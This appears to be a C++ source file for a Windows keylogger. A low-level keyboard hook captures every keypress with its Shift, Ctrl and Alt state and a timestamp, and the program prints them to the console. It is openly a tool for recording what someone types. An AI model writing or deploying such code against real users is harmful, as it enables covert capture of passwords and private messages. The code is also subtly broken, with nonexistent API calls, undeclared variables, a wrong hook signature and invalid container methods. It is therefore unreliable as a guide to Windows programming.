```cpp
#include <windows.h>
#include <userenv.h>
#include <iostream>
#include <queue>
#include <chrono>
#include <mutex>
#include <thread>

using namespace std;

struct KeyboardEvent {
    int key;
    bool is_pressed;
    bool shift;
    bool ctrl;
    bool alt;
    int timestamp;
};

class KeyLogger {
private:
    HWND hwnd;
    HHOOK hHook;
    queue<KeyboardEvent> events;
    mutex mtx;
    event e;
    bool running;

public:
    KeyLogger() {
        hwnd = CreateWindowEx(0, "KeyLogger", 0, 0, 0, 0, WS_OVERLAPPED, 0, HWND_DESKTOP, nullptr, nullptr);
        hHook = nullptr;
        running = true;
    }

    ~KeyLogger() {
        Stop();
    }

    bool Start() {
        if (!running)
            return false;
        hHook = SetWindowsHook(WH_KEYBOARD_LL, KeyHookProc, (LPARAM)&hwnd);
        running = true;
        return true;
    }

    bool Stop() {
        running = false;
        if (hHook) {
            UnhookWindowsHook(hHook);
            hHook = nullptr;
        }
        return true;
    }

    KeyboardEvent getNext() {
        while (running) {
            lock_guard lock(mtx);
            if (!events.empty()) {
                KeyboardEvent e = events.front();
                events.pop();
                return e;
            }
            Sleep(100); // To prevent high CPU usage
        }
        return {};
    }

    static LRESULT CALLBACK KeyHookProc(int h, int nCode, int wParam, int lParam) {
        if (nCode != 0)
            return CallNextHook(h, nCode, wParam, lParam);

        // Handle keyboard events
        KBDLLHOOK_KEYSTATE = GetAsyncKeyState(0);
        int key = wParam;
        bool is_pressed = (KBDLLHOOK_KEYSTATE & 0x1) != 0;
        bool shift = (KBDLLHOOK_KEYSTATE & 0x00020000) != 0;
        bool ctrl = (KBDLLHOOK_KEYSTATE & 0x00100000) != 0;
        bool alt = (KBDLLHOOK_KEYSTATE & 0x00010000) != 0;

        if (is_pressed && wParam != 0) {
            KeyboardEvent e;
            e.key = key;
            e.is_pressed = is_pressed;
            e.shift = shift;
            e.ctrl = ctrl;
            e.alt = alt;
            e.timestamp = std::chrono::system_clock::now().time_since_epoch().count();
            KeyLogger::getInstance().events.push_back(e);
        }

        return 0;
    }

    static KeyLogger& getInstance() {
        static KeyLogger instance;
        return instance;
    }
};

int main() {
    KeyLogger logger;
    if (!logger.Start()) {
        cout << "Failed to start keyboard hook" << endl;
        return 1;
    }

    while (true) {
        KeyboardEvent e = logger.getNext();
        if (!e.key) continue;

        cout << "Time: " << e.timestamp << "ms "
             << "Key: " << (char)e.key
             << " (";
        if (e.shift) cout << "Shift";
        if (e.ctrl) cout << " Ctrl";
        if (e.alt) cout << " Alt";
        cout << ")" << endl;
    }

    logger.Stop();
    return 0;
}
